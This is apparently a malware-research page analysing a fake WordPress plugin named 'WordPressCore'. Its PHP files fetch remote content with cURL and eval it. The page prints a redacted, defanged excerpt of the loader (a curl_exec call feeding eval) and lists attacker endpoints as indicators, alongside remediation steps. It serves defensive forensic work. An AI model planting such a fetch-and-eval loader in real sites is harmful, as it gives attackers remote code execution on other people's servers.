---
title: "WordPressCore Fake Plugin Remote Loader Research"
h1: "WordPressCore Fake Plugin with cURL-to-eval Loader Files"
slug: "wordpresscore-fake-plugin-remote-loader"
description: "Forensic review of a WordPressCore plugin directory containing small PHP files that retrieved remote text and passed it to eval."
status: "published"
reportDate: "2026-02-01"
lastReviewed: "2026-07-22"
threatCategory: "Fake plugin remote PHP loader"
affectedComponents:
  - "WordPress plugins directory"
  - "PHP cURL retrieval"
  - "Dynamic PHP evaluation"
observedLocations:
  - "wp-content/plugins/WordPressCore/hibgqdnj.php"
  - "wp-content/plugins/WordPressCore/iaactvgd.php"
confirmedBehaviors:
  - "Retrieves content from an external URL with cURL"
  - "Passes retrieved content to eval"
  - "Uses two small loader files in one plugin-like directory"
confidence: "High"
severity: "Critical"
severityRationale: "The supplied loader source directly retrieves and evaluates remote content. Directory and encoded-file screenshots with hosting identifiers or full blobs are excluded."
evidenceSource: "Anonymized investigation with three screenshots and retained source for two small remote loader files"
schemaType: "TechArticle"
screenshots:
  - src: "/wordpress-researches/WordPressCore_evidence-2.png"
    alt: "Code editor showing hibgqdnj.php retrieving a remote URL with cURL and evaluating the response"
    caption: "The six-line file retrieves a defanged endpoint and evaluates the returned body. The screenshot confirms code structure, not a successful response during the investigation."
    supports: "hibgqdnj.php implemented a remote-content evaluation path"
    width: 1023
    height: 766
    privacyReviewed: true
indicators:
  - value: "WordPressCore directory in this incident"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "hibgqdnj.php"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "iaactvgd.php"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "ndot[.]us/za and rentry[.]co/mmgbs/raw loaders"
    type: "distinctive artifact"
    confidence: "higher"
  - value: "cURL"
    type: "contextual indicator"
    confidence: "contextual"
  - value: "eval()"
    type: "contextual indicator"
    confidence: "contextual"
  - value: "crypto.txt"
    type: "contextual indicator"
    confidence: "contextual"
  - value: "include.php"
    type: "contextual indicator"
    confidence: "contextual"
limitations:
  - "No retained network response confirms what either endpoint returned."
  - "The screenshot does not prove execution."
  - "The initial compromise method and relationship to crypto.txt were not established."
  - "The hosting-account screenshot and full encoded blob are excluded for privacy and code safety."
relatedResearch:
  - "advanced-linkflow-control-hidden-plugin"
  - "wp-security-fake-plugin-eval-loader"
  - "system-control-hidden-backup-restoration"
relatedGuides:
  - title: "Known fake and malicious WordPress plugins"
    href: "/blog/comprehensive-list-of-known-fake-and-malicious-wordpress-plugins/"
  - title: "Hidden WordPress backdoor investigation"
    href: "/blog/i-found-a-hidden-backdoor-in-a-clients-wordpress-site/"
relatedCaseStudies: []
relatedService:
  title: "WordPress malware removal"
  href: "/wordpress-malware-removal/"
siteOwner:
  symptomGroups:
    - "unknown-plugins"
    - "suspicious-files-code"
  searchDescription: "Found a WordPressCore plugin that fetches and evaluates remote PHP? Review the loader evidence and why the name does not make it a core component."
  summary: "This entry helps owners investigate a plugin named WordPressCore that may be mistaken for a legitimate platform component. The retained files contained a remote PHP loading path; the response and resulting behavior were not preserved."
  observed:
    - "The supplied WordPressCore plugin files contained code that retrieved and evaluated a remote response."
  possible:
    - "The plugin name may make the directory look like a normal WordPress component during a quick review."
    - "The site may show no consistent symptom because the absent remote response controlled further behavior."
  questions:
    - "Is WordPressCore a legitimate WordPress core plugin?"
    - "Why would a plugin fetch and evaluate PHP from another server?"
  evidenceNote: "The loader is confirmed, but the remote payload, initial access path, and runtime result are not available."
canonical: "https://www.mdpabel.com/malware-research/wordpresscore-fake-plugin-remote-loader/"
index: true
---

## Summary

This WordPress malware research entry documents fake plugin remote php loader evidence observed during one anonymized client investigation. The narrow topic is **WordPressCore Fake Plugin with cURL-to-eval Loader Files**: the page records the exact artifact, identifiers, and visible control flow instead of repeating a general malware-removal article.

These are remote PHP loaders because successful responses are supplied to eval. The public page does not call either endpoint or reproduce a fully operational loader.

## Investigation context

Anonymized investigation with three screenshots and retained source for two small remote loader files. The report date is retained from the original investigation notes. Broader cleanup guidance remains in [the WordPress malware removal guide](/blog/wordpress-malware-removal-expert-guide-to-clean-hacked-wordpress-site/); this entry is limited to what the supplied code and screenshots support.

## Observed artifact

hibgqdnj.php implemented a remote-content evaluation path.

![Code editor showing hibgqdnj.php retrieving a remote URL with cURL and evaluating the response](/wordpress-researches/WordPressCore_evidence-2.png "The six-line file retrieves a defanged endpoint and evaluates the returned body. The screenshot confirms code structure, not a successful response during the investigation.")

## Confirmed findings

- hibgqdnj.php initializes cURL with ndot[.]us/za.
- It retrieves a response and passes it to eval.
- A second supplied file defines a get helper and evaluates content retrieved from rentry[.]co/mmgbs/raw.
- The files were grouped under a WordPressCore plugin-like directory in the retained investigation.

## Technical analysis

### How the loader hands a remote response to PHP

The following code keeps the identifiers and control flow needed for defensive verification while removing secrets, complete payloads, and operational request instructions.

**Redacted defensive excerpt**

```php
$url = 'hxxp://ndot[.]us/za';
$response = curl_exec(/* initialized handle */);
// error handling and endpoint details shortened
eval('?>' . $response);
```

This excerpt is intentionally incomplete. It should be used for code search, baseline comparison, and incident review—not copied into a live site.

## Analyst assessment

These are remote PHP loaders because successful responses are supplied to eval. The public page does not call either endpoint or reproduce a fully operational loader.

The severity reflects the capability visible in this artifact and its position in the investigated WordPress environment. It is not a claim about campaign prevalence, a particular vulnerability, or an outcome that the retained evidence does not show.

## Indicators of compromise

### Higher-confidence indicators

- `WordPressCore directory in this incident`
- `hibgqdnj.php`
- `iaactvgd.php`
- `ndot[.]us/za and rentry[.]co/mmgbs/raw loaders`

### Contextual indicators

- `cURL`
- `eval()`
- `crypto.txt`
- `include.php`

Contextual indicators are not proof of infection by themselves. Confirm them through trusted-file comparison, neighboring code, database provenance, request logs, or the distinctive combinations listed above.

## What this evidence does not establish

- No retained network response confirms what either endpoint returned.
- The screenshot does not prove execution.
- The initial compromise method and relationship to crypto.txt were not established.
- The hosting-account screenshot and full encoded blob are excluded for privacy and code safety.

## Artifact-specific remediation

- Preserve the entire fake plugin directory and relevant egress logs.
- Remove the directory and replace any affected legitimate components with trusted copies.
- Search for the two filenames, endpoints, and response-to-eval structure.
- Block known incident-specific endpoints as a secondary containment measure.

For a complete response sequence, use the [broader malware-removal guide](/blog/wordpress-malware-removal-expert-guide-to-clean-hacked-wordpress-site/) or the [WordPress malware-removal service](/wordpress-malware-removal/) when hands-on incident response is appropriate.

## Recurrence verification

- Verify the directory and small loader files do not return.
- Review outbound logs for repeated requests to the defanged endpoints.
- Monitor plugin paths for newly generated short PHP filenames.

## Related malware research

[Browse the WordPress malware research hub](/malware-research/).

- [Advanced LinkFlow Control Plugin Concealment and Remote Fetching](/malware-research/advanced-linkflow-control-hidden-plugin/)
- [WP-Security Fake Plugin with an eval Decode Wrapper](/malware-research/wp-security-fake-plugin-eval-loader/)
- [system-control Plugin Restored from wp-content/.sc-backup](/malware-research/system-control-hidden-backup-restoration/)

## Related guides and case studies

- [Known fake and malicious WordPress plugins](/blog/comprehensive-list-of-known-fake-and-malicious-wordpress-plugins/)
- [Hidden WordPress backdoor investigation](/blog/i-found-a-hidden-backdoor-in-a-clients-wordpress-site/)

## Methodology and privacy note

This analysis is based on retained code, screenshots, paths, and notes from an anonymized WordPress client investigation. Confirmed findings are limited to visible or supplied evidence; professional interpretation is labeled as analyst assessment. Screenshots were reviewed for client identifiers, account paths, usernames, email addresses, credentials, tokens, database details, and unrelated records. Sensitive or operational material remains outside the public page, and every public code block is a redacted defensive excerpt.
